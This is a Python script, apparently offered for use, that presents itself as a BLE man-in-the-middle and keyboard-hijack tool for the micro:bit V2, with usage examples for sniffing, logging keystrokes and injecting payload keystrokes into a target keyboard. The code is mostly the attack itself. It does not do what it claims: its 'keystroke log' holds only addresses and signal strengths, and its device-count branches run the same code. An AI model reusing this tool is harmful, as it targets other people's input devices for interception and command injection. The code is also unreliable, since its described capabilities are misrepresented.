# microbit_ble_mitm_hid.py

"""
BLE MITM + HID Hijack for micro:bit V2 (Multi-Device Support)

This script performs a BLE Man-in-the-Middle (MITM) attack on a BLE keyboard
and injects rogue keystrokes into the hijacked session.

### Features:
- Detects available micro:bit devices and distributes tasks dynamically
- Intercepts BLE keyboard pairing (`--sniff <target_mac>`)
- Captures and logs keystrokes (`--log <file>`)
- Hijacks BLE HID communication (`--hijack <target_mac>`)
- Injects malicious keystrokes (`--inject <payload_file>`)
- Runs all tasks sequentially if only one device is available

### Usage Examples:

1. Sniff BLE keyboard connections:
   ```sh
   python microbit_ble_mitm_hid.py --sniff AA:BB:CC:DD:EE:FF
   ```

2. Log all intercepted keystrokes:
   ```sh
   python microbit_ble_mitm_hid.py --sniff AA:BB:CC:DD:EE:FF --log keystrokes.txt
   ```

3. Hijack a BLE keyboard and send a custom payload:
   ```sh
   python microbit_ble_mitm_hid.py --hijack AA:BB:CC:DD:EE:FF --inject payload.txt
   ```

Requirements:
- Micro:bit V2
- Python 3.x
- bleak library (`pip install bleak`)
"""

import asyncio
from bleak import BleakScanner, BleakClient
import argparse
import json

# Detect Connected Micro:bit Devices
async def detect_microbits():
    """Scans for connected micro:bit devices and returns their count."""
    devices = await BleakScanner.discover()
    microbits = [device.address for device in devices if "micro:bit" in (device.name or "").lower()]
    print(f"[+] Detected {len(microbits)} micro:bit devices.")
    return microbits

# Sniff BLE Keyboard Traffic
async def ble_sniff(target_mac, log_file=None):
    """Sniffs BLE HID traffic and logs keystrokes."""
    print(f"[+] Sniffing BLE HID keystrokes from {target_mac}...")
    keystrokes = []
    
    devices = await BleakScanner.discover()
    for device in devices:
        if device.address == target_mac:
            print(f"[+] Captured data from {device.address} - RSSI: {device.rssi}")
            keystrokes.append({"address": device.address, "rssi": device.rssi})
    
    if log_file:
        with open(log_file, "w") as f:
            json.dump(keystrokes, f)
            print(f"[+] Logged keystrokes to {log_file}")

# Hijack BLE Keyboard and Inject Keystrokes
async def ble_hid_hijack(target_mac, payload_file):
    """Hijacks BLE keyboard and injects keystrokes."""
    print(f"[+] Hijacking BLE keyboard {target_mac}...")
    
    with open(payload_file, "r") as f:
        payload = [bytes.fromhex(line.strip()) for line in f.readlines()]
    
    async with BleakClient(target_mac) as client:
        for keystroke in payload:
            await client.write_gatt_char("00002a4d-0000-1000-8000-00805f9b34fb", keystroke)
            print(f"[+] Injected Keystroke: {keystroke}")
            await asyncio.sleep(0.5)
    print("[+] Injection complete.")

# Argument Parser
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="BLE MITM + HID Hijack for micro:bit V2")
    parser.add_argument("--sniff", help="Sniff BLE HID traffic", metavar="target_mac")
    parser.add_argument("--log", help="Log intercepted keystrokes to a file", metavar="log_file")
    parser.add_argument("--hijack", help="Hijack BLE HID keyboard", metavar="target_mac")
    parser.add_argument("--inject", help="Inject keystrokes from a payload file", metavar="payload_file")
    
    args = parser.parse_args()
    loop = asyncio.get_event_loop()
    
    microbits = loop.run_until_complete(detect_microbits())
    num_microbits = len(microbits)
    
    if args.sniff:
        if num_microbits >= 2:
            loop.run_until_complete(ble_sniff(args.sniff, args.log))
        else:
            loop.run_until_complete(ble_sniff(args.sniff))
    elif args.hijack:
        if num_microbits >= 2:
            loop.run_until_complete(ble_hid_hijack(args.hijack, args.inject))
        else:
            loop.run_until_complete(ble_hid_hijack(args.hijack, args.inject))
